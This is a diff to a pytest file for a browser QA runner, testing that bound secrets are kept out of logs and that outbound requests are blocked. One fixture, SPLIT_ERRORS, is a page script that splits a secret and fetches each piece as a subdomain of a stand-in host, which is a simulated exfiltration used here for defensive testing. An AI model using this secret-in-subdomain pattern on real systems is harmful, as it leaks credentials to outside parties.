@@ -16,6 +16,7 @@ from urllib.parse import quote, quote_plus
 
 import pytest
 from aqa_core.config import ProjectConfig
+from aqa_core.spec import Spec
 from aqa_runner.browser_session import BrowserSession
 from aqa_runner.document_origins import (
     DocumentChangedError,
@@ -444,17 +445,128 @@ def test_a_replay_that_binds_but_never_fills_a_secret_withholds_its_logs(
     files = saved(done.record.path / "evidence")
     assert (kinds(logs(files, "0")[0]), kinds(logs(files, "0")[1])) == WITHHELD
     assert holding(files, [*PIECES, *SPLIT]) == []
-    # The script fills nothing, so the egress record names hosts: scanned.
+    # The run binds a secret, so its egress record names no host or port.
     egress = (done.record.path / "egress.json").read_text()
-    refused = json.loads(egress)["refused"]
-    assert {"host": "[SECRET:TEST_PASSWORD].fragment.test", "port": 4100} in refused
+    assert json.loads(egress) == {
+        "error_code": "egress_blocked",
+        "refused_count": 4,
+        "overflowed": False,
+        "hosts_and_ports_withheld": True,
+    }
     assert value not in egress
+
+
+# The bound value's pieces, each logged as an error and sent to a refused
+# host on a port of its own.
+SPLIT_ERRORS = (
+    f"<script>{json.dumps(list(PIECES))}.forEach((piece, index) => {{"
+    " console.error(piece);"
+    " fetch(`http://${piece}.fragment.test:${4101 + index}/`).catch(() => null);"
+    " })</script>"
+)
+COUNTS_ONLY = {
+    "error_code": "egress_blocked",
+    "refused_count": 3,
+    "overflowed": False,
+    "hosts_and_ports_withheld": True,
+}
+NAMED = {
+    "error_code": "egress_blocked",
+    "refused": [
+        {"host": "fake.fragment.test", "port": 4101},
+        {"host": "spl1t.fragment.test", "port": 4102},
+        {"host": "va1ue.fragment.test", "port": 4103},
+    ],
+    "overflowed": False,
+    "hosts_and_ports_withheld": False,
+}
+
+
+def binding(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, page: str) -> Spec:
+    """A spec starting at `page` that binds the pieces' join, never filled."""
+    monkeypatch.setenv("AQA_SECRET_TEST_PASSWORD", "".join(PIECES))
+    return secret_spec(tmp_path, start_url=f"/page/{page}")
+
+
+@pytest.mark.parametrize(
+    ("binds", "part"),
+    [(True, ""), (True, "attempt-1"), (False, "")],
+    ids=["binds", "binds-in-a-part", "binds-none"],
+)
+def test_a_run_that_binds_a_secret_keeps_no_refused_host_or_invariant_text(
+    app: App, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, binds: bool, part: str
+) -> None:
+    created = RunRecord.create
+
+    def placed(base: Path) -> RunRecord:
+        record = created(base)
+        return replace(record, path=record.path / part)
+
+    # A replay into an attempt's part, as #53 makes one, when `part` names it.
+    monkeypatch.setattr(RunRecord, "create", placed)
+    monkeypatch.setitem(PAGES, "split-errors", SPLIT_ERRORS)
+    if binds:
+        spec = binding(monkeypatch, tmp_path, "split-errors")
+    else:
+        spec = a_spec(tmp_path, ProjectConfig(), start_url="/page/split-errors")
+
+    done = run(app, tmp_path, compiled([]), spec=spec)
+
+    assert (done.result.outcome, done.result.error_code) == (
+        "errored",
+        "egress_blocked",
+    )
+    runs = tmp_path / ".aqa" / "runs" / done.result.run_id
+    assert [path.relative_to(runs) for path in runs.rglob("egress.json")] == [
+        Path(part, "egress.json")
+    ]
+    assert json.loads((done.record.path / "egress.json").read_text()) == (
+        COUNTS_ONLY if binds else NAMED
+    )
+    assert [(i.name, i.outcome, i.seen, i.total) for i in done.result.invariants] == [
+        ("console_errors", "violated", () if binds else PIECES, 3),
+        ("js_exceptions", "held", (), 0),
+        ("http_5xx", "held", (), 0),
+        ("broken_images", "held", (), 0),
+    ]
+
+
+# A piece of the bound value for each invariant, and no refused request.
+EVERY_INVARIANT = (
+    '<img src="/image/fake"><script>new Worker("/worker/fetch-500.js");'
+    ' console.error("spl1t"); throw new Error("va1ue");</script>'
+)
+
+
+@pytest.mark.parametrize("binds", [True, False], ids=["binds", "binds-none"])
+def test_a_run_that_binds_a_secret_keeps_no_text_of_any_invariant(
+    app: App, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, binds: bool
+) -> None:
+    monkeypatch.setitem(PAGES, "every-invariant", EVERY_INVARIANT)
+    if binds:
+        spec = binding(monkeypatch, tmp_path, "every-invariant")
+    else:
+        spec = a_spec(tmp_path, ProjectConfig(), start_url="/page/every-invariant")
+
+    done = run(app, tmp_path, compiled([]), spec=spec)
+
+    seen = {
+        "console_errors": ("spl1t",),
+        "js_exceptions": ("va1ue",),
+        "http_5xx": (f"500 {app.origin}/status/500",),
+        "broken_images": (f"{app.origin}/image/fake",),
+    }
+    assert (done.result.outcome, done.result.error_code) == ("failed", None)
+    assert not (done.record.path / "egress.json").exists()
+    assert [(i.name, i.outcome, i.seen, i.total) for i in done.result.invariants] == [
+        (name, "violated", () if binds else texts, 1) for name, texts in seen.items()
+    ]
 
 
 @pytest.mark.parametrize(
     ("value", "saved_as"),
     [
-        # Its own marker spells it: the hosts can't be saved, the counts can.
+        # A bound run saves the counts-only form, which holds no spelling of it.
         (
             "fake",
             {
@@ -464,7 +576,8 @@ def test_a_replay_that_binds_but_never_fills_a_secret_withholds_its_logs(
                 "hosts_and_ports_withheld": True,
             },
         ),
-        # Both forms' own JSON spells it, and its marker breaks them: nothing.
+        # The counts-only form's own JSON spells it, and its marker breaks it:
+        # nothing.
         ("false", None),
     ],
 )
